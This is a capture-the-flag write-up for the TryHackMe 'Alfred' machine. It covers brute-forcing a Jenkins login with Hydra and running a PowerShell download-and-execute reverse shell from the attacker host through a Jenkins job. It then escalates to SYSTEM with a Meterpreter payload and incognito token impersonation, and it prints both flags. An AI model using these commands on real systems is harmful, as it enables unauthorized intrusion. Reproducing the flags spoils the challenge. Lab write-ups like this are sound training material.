# THM: Alfred

## Challenge Details

- **Platform:** [[TryHackMe]]
- **Challenge Type:** [[CyberSecurity]],[[Web Exploitation]], [[Windows Privilege Escalation]], [[Credential Brute-forcing]]
- **Difficulty:** Easy
- **Target Machine:** Alfred
- **Status:** #solved
- **Date Completed:** [[2025-05-21]]

## 🎯 Objective

This writeup details the process of gaining initial access to the "Alfred" machine by exploiting a vulnerable Jenkins instance, leveraging exposed credentials. The objective then involved escalating privileges to `NT AUTHORITY\SYSTEM` on the Windows host to retrieve both the user and root flags.

## 🛠️ Tools Used

- [[Nmap]]
- [[Burp Suite]]
- [[Hydra]]
- [[msfvenom]]
- [[Python3]] (`http.server`)
- [[Netcat]] (`nc`, `rlwrap`)
- [[Metasploit]] (`msfconsole`, `meterpreter`, `incognito`)
- [[PowerShell Cheatsheet]]

---

## 🔍 Reconnaissance

The initial phase focused on identifying open ports and services, particularly web applications that could serve as an entry point.

### Target Identification

The target IP address was set as an environment variable:

Bash

```
export TARGET=10.10.244.5
```

### Nmap Scan

A comprehensive `nmap` scan was performed to identify open ports and service versions.

Bash

```
nmap -sV -sC -Pn -oA alfred $TARGET
```

**Key findings from the `nmap` report:**

- **80/tcp:** HTTP
- **8080/tcp:** HTTP (likely another web service)
- **3389/tcp:** MS-WBT-Server (RDP)

### Web Application Analysis (Port 80)

Navigating to `http://$TARGET:80` displayed a simple webpage with a picture commemorating Bruce Wayne's death. No immediate vulnerabilities were apparent from inspecting the source code.

### Web Application Analysis (Port 8080: Jenkins)

Accessing `http://$TARGET:8080` revealed a **Jenkins** login page. This was the primary focus for initial access.

### Credential Brute-forcing with Hydra

To gain access to the Jenkins instance, a credential brute-force attack was launched using [[Hydra]]. First, [[Burp Suite]] was used to capture the login request and identify the correct parameters for the form post. A common username `admin` with a simple password `12345` was used in Burp to get a valid request to parse.

**Hydra Command:**

Bash

```
hydra -l admin -P /usr/share/wordlists/john.lst 10.10.244.5 -s 8080 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&form=%2F&Submit=Sign+in:loginError"
```

Result:

The brute-force attack successfully identified the correct credentials:

- **Username:** `admin`
- **Password:** `admin`

---

## 💥 Initial Access: Jenkins RCE

With valid credentials, the Jenkins dashboard was accessible, which is frequently vulnerable to Remote Code Execution due to its build capabilities.

### Jenkins Job Exploration

After logging in, a pre-existing "1" project (or similar) was examined. Checking its console output or configuration showed that a `whoami` command had been successfully executed previously, confirming command execution capabilities.

### Generating a Reverse Shell Payload

A Windows Meterpreter reverse TCP payload was generated using `msfvenom`. The `x86/shikata_ga_nai` encoder was used for obfuscation.

Bash

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.4.3.134 LPORT=80 -f exe -o revshell.exe
```

**Result:** `revshell.exe`

### Setting up Listener and Web Server

To deliver the payload and catch the shell, a [[Python3]] HTTP server and a [[Netcat]] listener were set up on the attacking machine.

**Python HTTP Server:**

Bash

```
python3 -m http.server 80
```

**Netcat Listener:**

Bash

```
rlwrap nc -nvlp 53
```

### Delivering and Executing the Payload via Jenkins

A new Jenkins "Freestyle project" (or modifying an existing one) was created/edited to execute a [[PowerShell Cheatsheet]] command. This command would download a standard PowerShell reverse shell script (`Invoke-PowerShellTcp.ps1`, which needs to be hosted on the attacker's web server) and then execute it, connecting back to the `netcat` listener.

**PowerShell Command in Jenkins:**

PowerShell

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.4.3.134:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.4.3.134 -Port 53
```

Executing this job in Jenkins initiated the reverse shell.

**Result:** The `netcat` listener successfully caught an incoming connection, providing an initial shell on the target.

### Retrieving the User Flag

The user flag was found on Bruce's desktop:

Bash

```
cd c:\users\bruce\desktop\
type user.txt
```

## 🚩 User Flag

```
79007a09481963edf2e1321abd9ae2a0
```

---

## 🪜 Privilege Escalation: Token Impersonation

With user-level access, the next goal was to escalate privileges to `NT AUTHORITY\SYSTEM`.

### Migrating to a Stable Meterpreter Shell

To facilitate privilege escalation using Metasploit's powerful post-exploitation modules, a more robust Meterpreter shell was desired. The `revshell.exe` (Meterpreter payload) generated earlier was used.

1. **Host `revshell.exe` (on Kali):** Ensure the Python HTTP server (from initial access) is still running and hosting `revshell.exe` on port 80.
    
2. **Download `revshell.exe` (from target shell):**
    
    PowerShell
    
    ```
    powershell (New-Object System.Net.WebClient).DownloadFile('http://10.4.3.134:80/revshell.exe','revshell.exe')
    ```
    
    _(Note: This command saves `revshell.exe` to the current working directory on the target.)_
    
3. **Set up Metasploit Listener (Kali):** A new Metasploit listener was set up to catch the incoming Meterpreter shell, this time on a different port (e.g., 8080) to avoid conflicts with the web server.
    
    Bash
    
    ```
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 10.4.3.134
    set LPORT 8080
    run
    ```
    
4. **Execute `revshell.exe` (from target shell):**
    
    PowerShell
    
    ```
    Start-Process "revshell.exe"
    ```
    
    This successfully launched the Meterpreter payload, and a new Meterpreter session connected to the Metasploit listener.
    

### Process Migration for Stability

Within the Meterpreter session, the `ps` command was run to list processes and identify a stable one running with high privileges. `services.exe` (PID 668) was found running as `NT AUTHORITY\SYSTEM`. Migrating to this process enhances stability and grants System-level privileges.

Code snippet

```
ps
migrate 668
```

### Token Impersonation with `incognito`

After migrating, the `incognito` module was loaded to perform token impersonation.

Code snippet

```
load incognito
list_tokens -g
```

This command listed available delegation tokens, including `BUILTIN\Administrators`.

The `BUILTIN\Administrators` token was impersonated:

Code snippet

```
impersonate_token "BUILTIN\Administrators"
```

The user ID was checked to confirm the privilege escalation:

Code snippet

```
getuid
```

**Result:**

```
Server username: NT AUTHORITY\SYSTEM
```

This confirmed full `NT AUTHORITY\SYSTEM` privileges.

### Retrieving the Root Flag

The `search` command in Meterpreter was used to locate `root.txt`:

Code snippet

```
search -f root.txt
```

Result:

The file was found at C:\Windows\System32\config\root.txt.

The contents of the file were then viewed:

Code snippet

```
cat C:\Windows\System32\config\root.txt
```

## 🏆 Root Flag

```
dff0f748678f280250f25a45b8046b4a
```

---

## 📚 Lessons Learned

- **Jenkins as a Target:** Jenkins instances, especially if publicly accessible, are common targets due to their build capabilities which often translate directly to RCE.
- **Credential Brute-forcing:** Tools like `Hydra` are effective for brute-forcing web login forms once the form parameters are identified (e.g., via Burp Suite).
- **Payload Delivery Methods:** Understand various ways to deliver payloads to a target (e.g., Python HTTP server + PowerShell `DownloadString` or `DownloadFile`).
- **Metasploit Post-Exploitation:**
    - **Process Migration:** Migrating to a stable, highly-privileged process (like `services.exe`) is crucial for maintaining a session and stability.
    - **`incognito` Module:** This module is powerful for Windows privilege escalation via token impersonation, allowing attackers to step into higher-privileged user contexts.
- **File System Enumeration:** Knowing common locations for flags and configuration files on Windows systems (e.g., `C:\Users\<user>\Desktop`, `C:\Windows\System32\config`) is important.

---

[[CyberSecurity]], [[Web Security]], [[Network Scanning]], [[Credential Brute-forcing]], [[Reverse Shell]], [[Privilege Escalation]]
